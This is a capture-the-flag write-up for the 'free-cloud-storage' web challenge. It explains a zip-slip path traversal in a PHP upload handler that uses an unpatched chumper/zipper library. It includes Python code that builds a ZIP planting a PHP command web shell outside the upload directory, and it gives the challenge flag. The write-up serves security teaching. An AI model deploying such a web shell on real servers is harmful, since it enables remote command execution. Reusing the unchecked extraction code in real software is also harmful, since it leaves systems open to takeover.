# free-cloud-storage

## 1. Summary

- **Category**: Web
- **Points**: 284
- **Solves**: 246

### Description

> `Free cloud storage, what could possibly go wrong?`

## 2. Analysis

### Vulnerability

The application allows users to upload a ZIP file, then extracts it into the `/uploads` directory:

```php
use Chumper\Zipper\Zipper;

$uploadDir = __DIR__ . '/uploads/';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_FILES['zipfile'])) {
        die("No file uploaded.");
    }

    $tmpName = $_FILES['zipfile']['tmp_name'];
    $fileName = basename($_FILES['zipfile']['name']);

    if (pathinfo($fileName, PATHINFO_EXTENSION) !== 'zip') {
        die("Only zip files allowed.");
    }

    $destination = $uploadDir . $fileName;

    if (!move_uploaded_file($tmpName, $destination)) {
        die("Upload failed.");
    }

    echo "<p>File uploaded. Extracting...</p>";

    $zipper = new Zipper();
    $zipper->make($destination)->extractTo($uploadDir);

    echo "<p>Extraction complete!</p>";
}
```

The only validation checks whether the uploaded file has a `.zip` extension. The contents of the archive are extracted without validating the internal file paths.

The application uses `chumper/zipper` version `1.0.2`:

```json
{
  "name": "free-cloud-storage/zip-upload",
  "require": {
    "chumper/zipper": "1.0.2"
  }
}
```

Looking at the library's history, version `1.0.3` introduced a patch to prevent ZIP traversal attacks:

```diff
@@ -613,6 +613,11 @@ class Zipper
     private function extractOneFileInternal($fileName, $path)
     {
         $tmpPath = str_replace($this->getInternalPath(), '', $fileName);
+
+        //Prevent Zip traversal attacks
+        if (strpos($fileName, '../') !== false || strpos($fileName, '..\\') !== false) {
+            throw new \RuntimeException('Special characters found within filenames');
+        }

         // We need to create the directory first in case it doesn't exist
         $dir = pathinfo($path.DIRECTORY_SEPARATOR.$tmpPath, PATHINFO_DIRNAME);
```

Since the challenge uses `1.0.2`, this protection is missing. Therefore, a ZIP entry such as `../shell.php` will be extracted outside the intended `/uploads` directory.

## 3. Exploit Flow

1. **Create a ZIP Traversal Payload**

   We create a ZIP file containing a PHP web shell. The internal filename is set to `../shell.php`:

   ```python
   payload = b'<?php system($_GET["cmd"]); ?>'
   buf = io.BytesIO()

   with zipfile.ZipFile(buf, "w") as zf:
       zf.writestr("../shell.php", payload)
   ```

   When extracted to `/uploads`, the file path becomes:

   ```text
   /uploads/../shell.php
   ```

   which resolves to:

   ```text
   /shell.php
   ```

1. **Upload the Malicious ZIP**

   ```python
   files = {
       "zipfile": ("shell.zip", buf.getvalue(), "application/zip")
   }

   requests.post(f"{BASE_URL}/upload.php", files=files)
   ```

1. **Execute Commands Through the Web Shell**

   After extraction, the shell is accessible at:

   ```text
   /shell.php?cmd=<command>
   ```

   Using this web shell, we can read the flag.

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

## 5. Flag

`tjctf{i_l0v3_fr33_st0r4g3}`
